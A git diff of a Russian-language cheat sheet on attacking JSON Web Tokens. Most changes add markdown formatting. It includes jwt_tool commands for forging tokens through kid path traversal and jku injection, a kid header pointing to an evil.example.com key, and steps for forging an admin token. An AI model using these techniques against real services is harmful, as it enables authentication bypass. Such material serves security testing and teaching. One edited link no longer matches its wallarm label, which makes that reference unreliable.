@@ -318,7 +318,8 @@ jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv
 [+] name = "John Doe"
 ```
 
-* Использование [pyjwt](https://pyjwt.readthedocs.io/en/stable/): pip install pyjwt
+* Использование [pyjwt](https://pyjwt.readthedocs.io/en/stable/): ```pip install pyjwt```
+
 ```python
 import jwt
 encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
@@ -326,7 +327,7 @@ jwt.decode(encoded, 'secret', algorithms=['HS256'])
 ```
 ## Взлом секрета JWT
 
-Полезный список из 3502 общедоступных JWT-секретов: [wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list), включая ```your_jwt_secret```, ```change_this_super_secret_random_string``` и т.д.
+Полезный список из общедоступных JWT-секретов: [wallarm/jwt-secrets/jwt.secrets.list](https://github.com/Kaupervud69/WebVuln/tree/main/JWTtoken/Intruder), включая ```your_jwt_secret```, ```change_this_super_secret_random_string``` и т.д.
 
 **Инструмент JWT**
 
@@ -394,44 +395,42 @@ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODk
 
 # JWT Claims
 
-Утверждения JSON Web Token от IANA
+* [Claims JSON Web Token от IANA](https://www.iana.org/assignments/jwt/jwt.xhtml)
 
 ## Неправильное использование утверждения kid в JWT
 
 Утверждение "kid" (идентификатор ключа) в JSON Web Token (JWT) — это необязательный параметр заголовка, который используется для указания идентификатора криптографического ключа, использованного для подписи или шифрования JWT. Важно отметить, что сам идентификатор ключа не обеспечивает никаких преимуществ безопасности, а скорее позволяет получателю найти ключ, необходимый для проверки целостности JWT.
-text
 
-Пример №1 : Локальный файл
-
+* Пример №1 : Локальный файл
+```python
 {
 "alg": "HS256",
 "typ": "JWT",
 "kid": "/root/res/keys/secret.key"
 }
-
-Пример №2 : Удаленный файл
-
+```
+* Пример №2 : Удаленный файл
+```
 {
 "alg":"RS256",
 "typ":"JWT",
 "kid":"http://localhost:7070/privKey.key"
 }
-
+```
 Содержимое файла, указанного в заголовке kid, будет использоваться для генерации подписи.
-
+```python
 // Пример для HS256
 HMACSHA256(
 base64UrlEncode(header) + "." +
 base64UrlEncode(payload),
 your-256-bit-secret-from-secret.key
 )
-
+```
 Распространенные способы неправильного использования заголовка kid:
-text
 
-Получение содержимого ключа для изменения полезной нагрузки
+* Получение содержимого ключа для изменения полезной нагрузки
 
-Изменение пути к ключу для использования своего собственного
+* Изменение пути к ключу для использования своего собственного
 
 >>> jwt.encode(
 ...     {"some": "payload"},
@@ -440,59 +439,61 @@ text
 ...     headers={"kid": "http://evil.example.com/custom.key"},
 ... )
 
-Изменение пути к ключу на файл с предсказуемым содержимым.
-
+* Изменение пути к ключу на файл с предсказуемым содержимым.
+```python
 python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
 python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
-text
-
-Изменение заголовка kid для попыток SQL-инъекций и инъекций команд.
+```
+* Изменение заголовка kid для попыток SQL-инъекций и инъекций команд.
 
 ## JWKS - внедрение через заголовок jku
 
 Значение заголовка "jku" указывает на URL файла JWKS. Заменив URL "jku" на контролируемый злоумышленником URL, содержащий открытый ключ, злоумышленник может использовать соответствующий закрытый ключ для подписи токена и позволить службе получить вредоносный открытый ключ и проверить токен.
 
 Иногда он раскрывается публично через стандартную конечную точку:
-text
-
+```
 /jwks.json
 /.well-known/jwks.json
 /openid/connect/jwks.json
 /api/keys
 /api/v1/keys
 /{tenant}/oauth2/v1/certs
+```
+Для этой атаки необходимо создать свою собственную пару ключей и разместить ее. Она должна выглядеть так:
 
-Для этой атаки вы должны создать свою собственную пару ключей и разместить ее. Она должна выглядеть так:
-
+```python
 {
-"keys": [
-{
-"kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
-"kty": "RSA",
-"e": "AQAB",
-"n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
+    "keys": [
+        {
+            "kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
+            "kty": "RSA",
+            "e": "AQAB",
+            "n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
+        }
+    ]
 }
-]
-}
+```
 
-Эксплуатация:
-text
+**Эксплуатация:**
 
-Использование ticarpi/jwt_tool
+* Использование [ticarpi/jwt_tool.](https://github.com/ticarpi/jwt_tool)
 
+```python
 python3 jwt_tool.py JWT_ТУТ -X s
 python3 jwt_tool.py JWT_ТУТ -X s -ju http://example.com/jwks.json
+```
 
-Использование portswigger/JWT Editor
-    Сгенерируйте новый ключ RSA и разместите его
-    Отредактируйте данные JWT
-    Замените заголовок kid на тот, что из вашего JWKS
-    Добавьте заголовок jku и подпишите JWT (опция Don't modify header должна быть отмечена)
+* Использование [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
 
-Деконструкция:
+1. Сгенерируйте новый ключ RSA и разместите его
+2. Отредактируйте данные JWT
+3. Замените заголовок kid на тот, что из вашего JWKS
+4. Добавьте заголовок jku и подпишите JWT (опция Don't modify header должна быть отмечена)
 
+**Деконструкция:**
+
+```python
 {"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json", "kid":"id_of_jwks"}.
 {"login":"admin"}.
 [Подписано новым закрытым ключом; открытый ключ экспортирован]
-
-Практические задания (Labs)
+```
